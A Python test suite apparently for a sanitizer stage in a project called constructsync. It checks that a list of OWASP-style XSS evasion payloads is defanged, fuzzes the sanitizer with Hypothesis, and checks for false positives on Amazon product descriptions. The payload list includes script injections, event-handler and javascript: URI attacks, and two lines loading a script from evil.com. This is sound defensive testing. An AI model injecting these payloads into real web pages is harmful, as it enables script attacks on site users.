"""
Comprehensive Security Test Suite for HTML Sanitizer.
Includes OWASP XSS evasion payloads, Hypothesis fuzzing, and Amazon dataset checks.
"""

from __future__ import annotations

import base64
import os
from html.parser import HTMLParser
from pathlib import Path
import polars as pl
import pytest
from hypothesis import settings, given, strategies as st

from constructsync.engine.sanitizer import SanitizerStage

# ── 1. HTML Stack Checker to verify tag balance ──────────────────────

class HTMLStructureChecker(HTMLParser):
    """HTML Parser that checks if tags are balanced and correctly closed."""
    def __init__(self) -> None:
        super().__init__()
        self.unbalanced = False
        self.stack: list[str] = []
        # Standard HTML5 void (self-closing) tags
        self.void_tags = {
            "area", "base", "br", "col", "embed", "hr", "img", "input",
            "link", "meta", "param", "source", "track", "wbr"
        }

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        t = tag.lower()
        if t not in self.void_tags:
            self.stack.append(t)

    def handle_endtag(self, tag: str) -> None:
        t = tag.lower()
        if t not in self.void_tags:
            if not self.stack or self.stack[-1] != t:
                self.unbalanced = True
            else:
                self.stack.pop()

    def is_valid(self) -> bool:
        return not self.unbalanced and len(self.stack) == 0


# ── Helper function to assert safety ──────────────────────────────────

def assert_payload_is_defanged(sanitized: str) -> None:
    """Ensure that the sanitized output does not contain active XSS structures."""
    lower_val = sanitized.lower()
    assert "<script" not in lower_val, f"Found script tag in: {sanitized}"
    assert "<iframe" not in lower_val, f"Found iframe tag in: {sanitized}"

    # Check for event handlers and protocol schemes inside tags
    class SecurityChecker(HTMLParser):
        def __init__(self) -> None:
            super().__init__()
            self.has_xss = False

        def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
            t_lower = tag.lower()
            if t_lower in ("script", "iframe"):
                self.has_xss = True
            for attr, val in attrs:
                if val:
                    val_lower = val.lower().strip()
                    # Event handlers start with 'on'
                    if attr.lower().startswith("on"):
                        self.has_xss = True
                    # Dangerous URI schemes
                    if "javascript:" in val_lower or "vbscript:" in val_lower or "data:" in val_lower:
                        self.has_xss = True

    sec_checker = SecurityChecker()
    sec_checker.feed(sanitized)
    assert not sec_checker.has_xss, f"Found active XSS structure in: {sanitized}"

    # Verify HTML tags balance
    checker = HTMLStructureChecker()
    checker.feed(sanitized)
    assert checker.is_valid(), f"Unbalanced HTML output: {sanitized}"


# ── 2. OWASP XSS Filter Evasion Payloads ─────────────────────────────

OWASP_PAYLOADS = [
    # Basic script tags
    "<script>alert('XSS')</script>",
    "<SCRIPT>alert('XSS')</SCRIPT>",
    "<script src=http://evil.com/xss.js></script>",
    # Nested tag tricks
    "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
    "<script/src=http://evil.com/xss.js></script>",
    # Event handlers on common elements
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=\"alert('XSS')\">",
    "<body onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    "<input type=\"image\" src=\"x\" onerror=\"alert(1)\">",
    "<a href=\"#\" onclick=\"alert(1)\">link</a>",
    # Protocol handlers (javascript, data, vbscript)
    "<a href=\"javascript:alert(1)\">click me</a>",
    "<iframe src=\"javascript:alert(1)\"></iframe>",
    "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></iframe>",
    "<link rel=\"stylesheet\" href=\"javascript:alert(1)\">",
    # CSS expression attacks
    "<div style=\"width: expression(alert(1))\">style xss</div>",
    "<div style=\"background-image: url(javascript:alert(1))\">style xss</div>",
    "<div style=\"behavior: url(xss.htc);\">style xss</div>",
    # Encoding tricks
    "&#X3c;script&#X3e;alert(1)&#X3c;/script&#X3e;",
    "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",
    # SVG-based XSS
    "<svg xmlns=\"http://www.w3.org/2000/svg\"><g onload=\"javascript:alert(1)\"></g></svg>",
    # Mixed and obscure elements
    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
    "<object classid=\"clsid:333C7BC4-460F-11D0-BC04-0080C7055A83\"><param name=\"DataURL\" value=\"javascript:alert(1)\"></object>",
]

def test_owasp_xss_evasions():
    """Verify that all standard OWASP XSS evasion vectors are completely defanged."""
    stage = SanitizerStage()
    for payload in OWASP_PAYLOADS:
        sanitized, _, _, _ = stage.sanitize_html(payload)
        assert_payload_is_defanged(sanitized)


# ── 3. Hypothesis Property-Based Fuzz Testing ─────────────────────────

# We run 10,000 cases to satisfy the fuzzing acceptance criteria
# Strategy that generates either printable ASCII characters or one of our custom substrings
chunk_strategy = st.characters(
    whitelist_categories=("Lu", "Ll", "Nd", "P", "Zs", "Po"),
    min_codepoint=32,
    max_codepoint=127,
) | st.sampled_from([
    "<script>", "</script>", "onerror=", "javascript:", "<iframe>", "</iframe>", "<b>", "</b>", "<img src=x>"
])

# Generate a list of these chunks and join them
input_str_strategy = st.lists(chunk_strategy, min_size=0, max_size=50).map("".join)


@pytest.mark.hypothesis
@settings(max_examples=10000, deadline=None)
@given(input_str_strategy)
def test_hypothesis_fuzz_properties(input_str: str):
    """Fuzz test sanitizer properties: safety, tag balance, and idempotency."""
    stage = SanitizerStage()
    sanitized1, _, _, _ = stage.sanitize_html(input_str)
    
    # 1. Safety property: Output never contains active dangerous strings
    assert_payload_is_defanged(sanitized1)

    # 2. Idempotency property: sanitize(sanitize(x)) == sanitize(x)
    sanitized2, _, _, _ = stage.sanitize_html(sanitized1)
    assert sanitized1 == sanitized2, f"Idempotency failed: first={sanitized1}, second={sanitized2}"


# ── 4. Legitimate Data Protection (False Positives) ───────────────────

def test_amazon_dataset_false_positives():
    """Ensure that the sanitizer does not mangle or destroy legitimate catalog data."""
    csv_path = Path("data/raw/amazon-2020/home/sdf/marketing_sample_for_amazon_com-ecommerce__20200101_20200131__10k_data.csv")
    assert csv_path.exists(), "Amazon dataset file not found!"

    # Read the dataset using polars
    df = pl.read_csv(csv_path)
    stage = SanitizerStage()

    # We validate a sample of 1,000 product descriptions
    descriptions = df["About Product"].drop_nulls().head(1000).to_list()
    assert len(descriptions) > 0, "No valid product descriptions found in the Amazon dataset"

    for desc in descriptions:
        # Ignore empty/whitespace descriptions
        if not desc.strip():
            continue
            
        sanitized, tags_stripped, _, _ = stage.sanitize_html(desc)
        
        # Verify safety metrics
        assert_payload_is_defanged(sanitized)
        
        # Verify false-positives: since the description is legitimate,
        # we check that standard words are preserved and character lengths remain proportional
        orig_words = [w for w in desc.split() if "<" not in w and ">" not in w]
        san_words = [w for w in sanitized.split() if "<" not in w and ">" not in w]
        
        # Standard words should not be deleted (we allow up to 5% variance for space/formatting stripping)
        difference_pct = abs(len(orig_words) - len(san_words)) / max(1, len(orig_words))
        assert difference_pct < 0.05, f"Legitimate content was lost! Original word count: {len(orig_words)}, Sanitized: {len(san_words)}\nOriginal: {desc}\nSanitized: {sanitized}"
        
        # Whitelisted formatting tags like <b> or <br> must be preserved
        if "<b>" in desc:
            assert "<b>" in sanitized
        if "<i>" in desc:
            assert "<i>" in sanitized
